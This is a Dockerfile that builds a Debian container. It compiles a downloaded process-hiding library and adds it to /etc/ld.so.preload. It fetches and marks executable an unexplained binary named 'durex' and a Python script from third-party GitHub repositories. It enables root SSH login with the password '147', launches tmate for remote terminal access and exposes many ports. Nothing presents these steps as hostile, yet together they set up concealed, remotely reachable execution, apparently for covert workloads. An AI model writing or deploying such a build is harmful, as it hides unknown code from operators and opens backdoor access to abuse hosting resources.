FROM debian as base
ENV DEBIAN_FRONTEND=noninteractive
RUN apt update && apt upgrade -y && apt install -y \
    ssh git wget nano curl python3 python3-pip tmate
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload   

FROM base as venv_setup

# Buat direktori untuk SSH
RUN mkdir /run/sshd \
    
    
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt \
    && chmod +x durex


RUN python3 -m venv myenv \
    && echo 'source /myenv/bin/activate' >> /openssh.sh \
    && echo 'sleep 5' >> /openssh.sh \
    && echo "tmate -F &" >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >> /openssh.sh \
    && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
    && echo root:147|chpasswd \
    && chmod 755 /openssh.sh

FROM venv_setup as final
    
EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000
CMD /openssh.sh
